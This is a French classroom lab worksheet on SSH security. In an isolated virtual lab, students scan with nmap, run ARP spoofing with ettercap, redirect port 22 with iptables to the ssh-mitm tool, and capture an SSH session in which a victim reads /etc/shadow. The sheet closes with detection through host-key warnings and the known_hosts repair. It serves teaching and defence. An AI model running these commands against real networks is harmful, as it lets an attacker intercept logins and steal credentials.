Sécurité SSH et MITM · le TP

Le pas-à-pas de l'activité, dans l'ordre où on le fait sur les machines : on découvre SSH, on observe le réseau, puis on monte l'attaque, routage, redirection, ARP spoofing, pour enfin la détecter et remettre la connexion en état. Les commandes se copient d'un clic ; cochez les actions au fur et à mesure. Les 19 questions sont posées à leur place, réponse repliable.

🎯 Avant de commencer

Tout se passe dans l'environnement de lab du TP : des machines virtuelles isolées, sur un réseau qui n'appartient qu'à vous.

On apprend à mener une attaque pour savoir s'en défendre, jamais sur un réseau tiers, où ce serait illégal.

Le compte de travail est etuciel ; on devient administrateur avec sudo, au cas par cas, jamais en root permanent.

00Rallumer le lab, et les machines

Quand tu rallumes ton PC, les conteneurs du lab sont arrêtés, pas perdus. Pas besoin de les relancer un par un (docker start sur chacun) : le script les relance tous d'un coup.

hôte · dossier du script
bash gestion_lab1.sh -l     # relance les 4 conteneurs arretes
docker ps                   # doit en montrer 4
🔌 Les commandes de base, quand on les oublie
bash
docker ps                      # les conteneurs qui TOURNENT
docker ps -a                   # TOUS, meme ceux qui sont arretes
docker start $(docker ps -aq)  # relancer TOUS les conteneurs arretes
bash gestion_lab1.sh -l        # ou, propre : relancer tout le lab
ssh etuciel@192.168.56.10      # entrer dans une machine (ou .11 .12 .254)

docker start $(docker ps -aq) fait en une ligne ce que docker ps -a puis un docker start par conteneur font à la main. Le reste (installer Docker, créer ou supprimer le lab) est au TP Docker Lab 1.

⚠️ Relancer, ce n'est pas recréer

-l relance ce qui existait : ton travail est gardé. -c crée à neuf, -d supprime tout (volumes compris). Après un simple redémarrage, c'est -l.

01Découverte du service SSH

On administre un serveur Linux à distance, proprement, puis on établit une première connexion pour voir comment SSH présente l'identité du serveur.

1Q1 Facile

Q1. Pourquoi l'accès aux machines virtuelles par la console ou l'interface graphique n'est pas possible avec le super-administrateur root ?

✅ Réponse

Par sécurité, la connexion directe en root est désactivée : un attaquant qui devine le mot de passe de root aurait aussitôt tous les droits, et les actions faites en root ne sont rattachées à aucun utilisateur nommé, donc non traçables.

On se connecte avec un compte ordinaire, puis on élève ses droits ponctuellement.

2Q2 Facile

Q2. Expliquer à quoi sert la commande sudo et quels avantages elle a sur l'utilisation de « su - ».

✅ Réponse

sudo exécute une seule commande avec les droits d'administrateur, après avoir demandé le mot de passe de l'utilisateur (pas celui de root).

Avantages sur su -, qui ouvre une session root entière : chaque action élevée est journalisée (qui, quand, quoi), les droits sont accordés au cas par cas, et le mot de passe de root n'a pas besoin d'être connu ni même défini.

serveur · srvssh
dpkg -l | grep openssh-server     # installe ?
systemctl status ssh              # demarre ? (ou sshd)
ss -ltnp | grep :22               # ecoute bien sur le port 22 ?

3Q3 Facile

Q3. Quelles commandes permettent de savoir si le service OpenSSH (serveur) est déjà installé et démarré ?

✅ Réponse
terminal
dpkg -l | grep openssh-server     # installe ?
systemctl status ssh              # demarre ? (ou sshd)

La première liste les paquets installés et filtre sur openssh-server ; la seconde interroge le gestionnaire de services sur l'état du démon SSH (actif, arrêté, au démarrage).

4Q4 Facile

Q4. Indiquer le répertoire des clés publique et privée et les permissions appliquées, puis le fichier de configuration du service SSH.

✅ Réponse

Les clés d'hôte du serveur sont dans /etc/ssh/ : par exemple ssh_host_ed25519_key (privée, permissions 600, lisible par root seul) et ssh_host_ed25519_key.pub (publique, 644).

Le fichier de configuration du démon est /etc/ssh/sshd_config. (À ne pas confondre avec ssh_config, qui configure le client.)

1.1 · Première connexion : le modèle TOFU

client · clissh
ssh etuciel@exemple.fr
sortie observée · 1ʳᵉ connexion
The authenticity of host 'exemple.fr (192.168.56.10)' can't be established.
ED25519 key fingerprint is SHA256:IPIxEKxsYHPP3i7iMiZZXLYUoW9viLwSfF39MNoWIM4.
Are you sure you want to continue connecting (yes/no)?

5Q5 Facile

Q5. Que signifie l'alerte « The authenticity of host … can't be established » ? Devez-vous continuer ? Pourquoi ?

✅ Réponse

C'est la question TOFU du premier usage : le client n'a jamais vu ce serveur, il ne peut donc pas garantir son identité et affiche son empreinte de clé.

On ne continue (yes) qu'après avoir vérifié que l'empreinte affichée est bien celle que l'administrateur a communiquée. Sinon, on refuse : accepter les yeux fermés, c'est accepter un éventuel imposteur.

6Q6 Facile

Q6. Lors d'une prochaine connexion depuis le même client, ce message réapparaîtra-t-il ? Pourquoi ?

✅ Réponse

Non. En répondant yes, l'empreinte a été enregistrée dans ~/.ssh/known_hosts. Aux connexions suivantes, le client y retrouve la clé, la compare à celle présentée : elles correspondent, donc aucune question.

Le message ne reviendrait que si la clé du serveur changeait, ou si quelqu'un se faisait passer pour lui.

7Q7 Facile

Q7. Sur la machine cliente, à quoi sert le fichier /home/etuciel/.ssh/known_hosts ?

✅ Réponse

Il mémorise les clés publiques des serveurs déjà visités. C'est lui qui permet au client de reconnaître un serveur d'une fois sur l'autre et de détecter un changement de clé. C'est la pièce centrale de l'authentification du serveur côté client.

⚠️ Pourquoi on vide known_hosts maintenant

Pour la suite, on veut rejouer le comportement d'un utilisateur qui se connecte pour la première fois (ou qui ignore les avertissements) pendant que l'attaquant intercepte.

On vide donc le fichier, sans le supprimer, pour effacer la clé déjà apprise.

client · clissh
echo > ~/.ssh/known_hosts

02Reconnaissance du réseau

Avant d'attaquer, on observe. Depuis kali, l'attaquant cartographie le réseau pour choisir sa cible.

🛠️ Les options nmap utilisées

nmap -sP (balayage ping) repère quelles machines sont allumées, sans toucher à leurs ports. nmap -sV scanne les ports ouverts d'une cible et interroge les bannières pour connaître le service et sa version exacte.

attaquant · kali
nmap -sP 192.168.56.0/24     # quels hotes sont allumes
nmap -sV 192.168.56.10       # le serveur SSH
nmap -sV 192.168.56.11       # le client
nmap -sV 192.168.56.254      # la passerelle
sortie observée · nmap -sV
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
Service Info: OS: Linux

8Q8 Facile

Q8. Quelles informations un attaquant obtient-il grâce aux commandes nmap ?

✅ Réponse
terminal
nmap -sP 192.168.56.0/24     # quels hotes sont allumes
nmap -sV 192.168.56.10       # quels ports, quels services, quelles versions

Le premier scan dresse la liste des machines actives sur le réseau (découverte d'hôtes). Le second révèle, pour une machine, les ports ouverts, les services qui écoutent et souvent leur version précise (par exemple OpenSSH 9.2p1).

L'attaquant sait alors quoi viser, ici, le port 22/SSH, et peut chercher des failles connues de cette version.

⚠️ Un scan se voit

Un balayage nmap génère un trafic caractéristique qu'un IDS (système de détection d'intrusion) repère. La reconnaissance n'est pas invisible : c'est déjà un signal pour le défenseur.

03Préparer l'interception

L'attaquant réunit les deux conditions qui rendront le MITM possible : relayer le trafic, et le faire passer par son outil d'interception.

9Q9 Moyen

Q9. Expliquer les principes généraux d'une attaque de l'homme du milieu (MITM).

✅ Réponse

L'attaquant se place entre deux correspondants et relaie leurs échanges, de sorte que chacun croit parler directement à l'autre. Comme tout passe par lui, il peut lire, et souvent modifier, les messages, sans que les victimes sachent que le canal est compromis (cours, section 9).

3.1 · Relever les caches ARP sains

💡 Ce que fait ip neigh show

Elle affiche la table de voisinage (le cache ARP) : la correspondance entre chaque IP du réseau local et sa MAC. Si le cache est vide, un ping vers la machine force d'abord une requête ARP.

client · clissh
ip neigh show
serveur · srvssh
ip neigh show

10Q10 Moyen

Q10. Noter les associations IP/MAC présentes sur les deux machines. Sont-elles cohérentes ?

✅ Réponse

Avant l'attaque, oui : chaque IP pointe vers la MAC de la bonne machine, et les deux caches concordent. C'est l'état de référence : celui auquel on comparera après l'empoisonnement pour prouver l'attaque.

3.2 · Installer ssh-mitm et ses scripts (sur kali)

⚙️ Ce que préparent les scripts

start.sh active le routage IP, redirige le port 22 vers le port 10022 où écoute ssh-mitm, et journalise la session.

stop.sh arrête l'outil, vide les règles iptables et coupe le routage. L'option --break-system-packages autorise pip à installer le paquet globalement sur les Debian/Kali récentes.

attaquant · kali
sudo pip install ssh-mitm --break-system-packages
mkdir -p ~/ssh-mitm
sudo mkdir -p /home/ssh-mitm
kali · ~/ssh-mitm/start.sh
#!/bin/bash
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 10022
ssh-mitm server --remote-host 192.168.56.10 2>&1 | tee -a /home/ssh-mitm/shell_session_0.txt
kali · ~/ssh-mitm/stop.sh
#!/bin/bash
pkill -f "ssh-mitm server"
iptables -t nat -F
sysctl -w net.ipv4.ip_forward=0
attaquant · kali
chmod +x ~/ssh-mitm/start.sh ~/ssh-mitm/stop.sh
cd ~/ssh-mitm
sudo ./start.sh

11Q11 Moyen

Q11. Pourquoi l'activation du routage sur la machine de l'attaquant est-elle indispensable au MITM ?

✅ Réponse
terminal
sysctl -w net.ipv4.ip_forward=1

Une fois le trafic détourné vers lui, l'attaquant doit le faire suivre au vrai destinataire, sinon la communication est coupée et l'attaque immédiatement repérée.

Le routage (ip_forward) lui permet de relayer les paquets : la victime continue de recevoir ses réponses, et ne remarque rien.

kali · 2ᵉ terminal
ss -ltnp                         # (un L minuscule : "listening")
sudo iptables -t nat -L -n -v

12Q12 Moyen

Q12. Pourquoi la redirection de ports est-elle indispensable au succès de l'attaque ?

✅ Réponse
terminal
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 10022

Relayer ne suffit pas : pour intercepter le contenu d'une session SSH, l'attaquant doit que le flux passe par son propre outil d'interception, qui joue le serveur face au client.

La redirection envoie tout ce qui arrive sur le port 22 vers le port local où cet outil écoute (10022). Sans elle, les paquets seraient simplement transmis, jamais déchiffrés par l'attaquant.

💡 Deux rôles, une machine

Pendant l'attaque, kali tient deux rôles : elle est le « serveur » pour le client, et le « client » pour le vrai serveur. Le routage assure le relais, la redirection assure l'interception.

04L'ARP spoofing en action

On lance l'empoisonnement ARP avec ettercap, puis on prouve, capture à l'appui, que le trafic passe désormais par kali.

13Q13 Moyen

Q13. En quoi une attaque ARP Spoofing est-elle utile ici au pirate ?

✅ Réponse

C'est le moyen de se placer au milieu. En empoisonnant les caches ARP, l'attaquant fait croire au client qu'il est le serveur, et au serveur qu'il est le client.

Le trafic, qui irait normalement en droite ligne, est forcé de transiter par lui : condition préalable au MITM (cours, section 8).

⚡ La commande ettercap

-i eth0 : l'interface. -T : mode texte. -M arp : module homme-du-milieu par empoisonnement ARP bidirectionnel. /192.168.56.10// /192.168.56.11// : les deux cibles (serveur et client).

attaquant · kali
sudo ettercap -i eth0 -T -M arp /192.168.56.10// /192.168.56.11//
client & serveur
ip neigh show

14Q14 Moyen

Q14. Comparer les caches ARP après l'attaque avec ceux de la question 10. Qu'en concluez-vous ?

✅ Réponse

Après l'empoisonnement, l'IP du serveur (et celle du client) pointe désormais vers la MAC de l'attaquant. Deux IP différentes partagent la même MAC : c'est incohérent, et c'est la signature de l'ARP spoofing.

On conclut que le cache a été empoisonné et que le trafic passe par un tiers.

15Q15 Moyen

Q15. À partir de ces observations, expliquer en détail comment fonctionne une attaque ARP Spoofing.

✅ Réponse

ARP associe une IP à une MAC, et n'authentifie pas les réponses. L'attaquant en abuse : il envoie en boucle de fausses réponses ARP (même non sollicitées) affirmant « l'IP X, c'est ma MAC ».

Les victimes mettent à jour leur cache et lui envoient désormais ce qu'elles croyaient destiner à l'autre. Comme le routage est activé, il relaie : l'attaque reste invisible côté utilisateur (cours, section 7).

🛠️ Lancer Wireshark

Dans le menu, Applications puis Internet puis Wireshark ; choisir l'interface eth0.

Si la capture est refusée (il faut être administrateur pour écouter la carte), autoriser une fois pour toutes les comptes ordinaires :

bash
sudo dpkg-reconfigure wireshark-common
# repondre "Yes" a : Should non-superusers be able to capture packets?
client · clissh
ping -c 4 192.168.56.10
💡 Lire la capture

Dans les trames ARP, on voit l'attaquant répondre en boucle « cette IP, c'est ma MAC » pour le serveur comme pour le client : c'est l'empoisonnement, pris sur le fait.

Et sur les ICMP, pour chaque ping, kali voit deux trames : une entrant vers elle (MAC source = client, MAC dest = kali), puis une repartant vers le serveur (MAC source = kali), avec le TTL décrémenté de 1 (64 passe à 63). C'est la preuve du relais.

16Q16 Moyen

Q16. Envoyer un ping du client vers le serveur, puis vérifier par une capture sur la machine attaquante que les trames passent bien par elle. Qu'est-ce qui le démontre ?

✅ Réponse

Sur la capture (Wireshark) faite sur la machine de l'attaquant, on voit apparaître les trames ICMP écho échangées entre le client et le serveur, alors qu'elles ne devraient pas y transiter. Leur présence sur cette machine démontre que le trafic est bien détourné par elle : l'attaque fonctionne.

05Exploiter le milieu

Le client se connecte en SSH en croyant parler au serveur. Sa connexion arrive en réalité sur ssh-mitm, qui présente sa propre clé, et comme known_hosts a été vidé, le client ne voit qu'un simple avertissement de première connexion.

🕵️ Ce qui se passe à la connexion piégée

L'outil ouvre en parallèle la vraie session vers le serveur et enregistre tout en clair : c'est exactement ce que SSH est censé empêcher, rendu possible ici par le geste humain (vider known_hosts, taper yes sans vérifier).

client · session interceptée
ssh etuciel@exemple.fr
# repondre "yes" puis saisir le mot de passe
sudo cat /etc/shadow
sudo iptables -L
attaquant · kali
cd ~/ssh-mitm
sudo ./stop.sh
sudo cat /home/ssh-mitm/shell_session_0.txt

17Q17 Moyen

Q17. Que contient le fichier /home/ssh-mitm/shell_session_0.txt sur la machine attaquante ?

✅ Réponse

Le journal de la session interceptée : tout ce que le client a transmis en pensant parler au serveur, enregistré en clair par l'outil d'interception, commandes tapées, et éventuellement identifiants. C'est le but de l'attaque, et la preuve concrète de sa réussite.

⚠️ Lire ne veut pas dire tout obtenir

Même au milieu, l'attaquant ne récupère en clair que ce qui transite par son faux serveur SSH. Et, comme le montre la partie suivante, cette position déclenche une alerte côté client dès qu'il compare la clé.

06Détection et contre-mesures

Le dénouement : on arrête l'attaque, on nettoie, et SSH détecte l'imposture tout seul dès que le client retrouve la vraie clé.

client · clissh
sudo ip neigh flush all
ssh etuciel@exemple.fr
sortie observée · alerte SSH
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
The fingerprint for the ED25519 key sent by the remote host is
SHA256:iO+me7aX2v3eHBi+5cdiGOjHiAO/prPgk8Jgz1a9n24.
Please contact your system administrator.
Offending ED25519 key in /home/etuciel/.ssh/known_hosts:1

18Q18 Analyse

Q18. Expliquer pourquoi le message « REMOTE HOST IDENTIFICATION HAS CHANGED » apparaît.

✅ Réponse

À la reconnexion, le serveur présenté est en réalité l'attaquant, avec sa clé d'hôte. Le client compare cette clé à celle rangée dans known_hosts : elles diffèrent.

SSH en déduit que l'identité du serveur a changé, ce qui peut signaler un MITM, affiche l'avertissement et refuse la connexion (cours, section 10).

19Q19 Analyse

Q19. Proposer une solution pour pouvoir à nouveau se connecter au service SSH depuis le client.

✅ Réponse

Deux temps. D'abord traiter l'attaque : stopper l'ARP spoofing, nettoyer les caches ARP, et s'assurer qu'on parle bien au vrai serveur. Ensuite seulement, retirer l'ancienne entrée du client pour qu'il réapprenne la bonne clé :

terminal
ssh-keygen -f "/home/etuciel/.ssh/known_hosts" -R "exemple.fr"

Supprimer l'entrée sans avoir écarté l'attaque serait une faute : on ré-accepterait la clé de l'attaquant. L'avertissement n'est pas un obstacle à contourner, c'est une alerte à prendre au sérieux.

💡 Ce que le TP démontre vraiment

L'attaque a été détectée et bloquée par SSH. Le point faible n'était pas le protocole, mais le geste humain : vider known_hosts, ignorer l'alerte.

Les contre-mesures agissent sur les deux plans : le réseau (surveillance ARP, tables statiques) et la vigilance (vérifier l'empreinte, ne jamais passer outre l'avertissement).

⚡ Le TP en six gestes

  • Découvrir : vérifier le service SSH, établir la première connexion (TOFU), comprendre known_hosts.
  • Reconnaître : nmap pour trouver la cible, et savoir que le scan se voit.
  • Préparer : relever les caches ARP sains, installer ssh-mitm, activer routage et redirection.
  • Empoisonner : ettercap -M arp, puis prouver le détour par une capture.
  • Exploiter : intercepter la session et lire le journal en clair.
  • Détecter et réparer : SSH bloque sur le changement de clé ; on traite l'attaque avant de retirer l'ancienne clé.
